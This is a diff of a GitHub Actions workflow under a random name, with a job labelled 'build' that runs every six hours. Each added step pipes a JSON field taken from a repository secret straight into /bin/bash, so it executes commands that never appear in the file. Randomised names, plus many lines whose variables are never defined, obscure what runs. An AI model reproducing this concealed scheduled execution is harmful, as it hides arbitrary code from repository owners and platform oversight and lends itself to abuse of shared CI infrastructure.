@@ -1,24 +1,39 @@
 name: wuhaoning3214
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 0/6 * * *'
-
+    - cron: '51 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          oh370: ${{ secrets.oh370 }}
+          ow19: ${{ secrets.ow19 }}
         run: |
-          echo $oh370 | jq -r .nrzqx1 | /bin/bash
-          echo $yeqs1011 | jq -r .j3 | /bin/bash
-          echo $ysqgm60870 | jq -r .mici501 | /bin/bash
-          echo $e821 | jq -r .ry56091 | /bin/bash
-          echo $xe57890 | jq -r .qvv50 | /bin/bash
-          echo $woira669 | jq -r .idv1963 | /bin/bash
-          echo $g0 | jq -r .q307 | /bin/bash
-          echo $foki3816 | jq -r .cjils8 | /bin/bash
+          echo $ow19 | jq -r .st54997 | /bin/bash
+          echo $rij84105 | jq -r .os3 | /bin/bash
+          echo $kvn487 | jq -r .tbesl254 | /bin/bash
+          echo $wwl4335 | jq -r .ohr84496 | /bin/bash
+          echo $zn8897 | jq -r .vv0414 | /bin/bash
+          echo $n773 | jq -r .q62903 | /bin/bash
+          echo $dubso0307 | jq -r .onras55474 | /bin/bash
+          echo $f420 | jq -r .l48752 | /bin/bash
+          echo $wggf88013 | jq -r .eco13 | /bin/bash
+          echo $mgm9 | jq -r .vxug62 | /bin/bash
+          echo $dry74033 | jq -r .qvoug86740 | /bin/bash
+          echo $hxz933 | jq -r .k91 | /bin/bash
+          echo $lho109 | jq -r .wtn12251 | /bin/bash
+          echo $baqq32 | jq -r .ozp0361 | /bin/bash
+          echo $zbeyz6851 | jq -r .igne418 | /bin/bash
+          echo $xf65 | jq -r .n59 | /bin/bash
+          echo $lc6 | jq -r .juyj63584 | /bin/bash
+          echo $khi977 | jq -r .ib5337 | /bin/bash
+          echo $nyby04884 | jq -r .pifa5789 | /bin/bash
+          echo $e9 | jq -r .riym4 | /bin/bash
+          echo $i4 | jq -r .tktpe66 | /bin/bash
+          echo $gwq69558 | jq -r .pjvb390 | /bin/bash
 
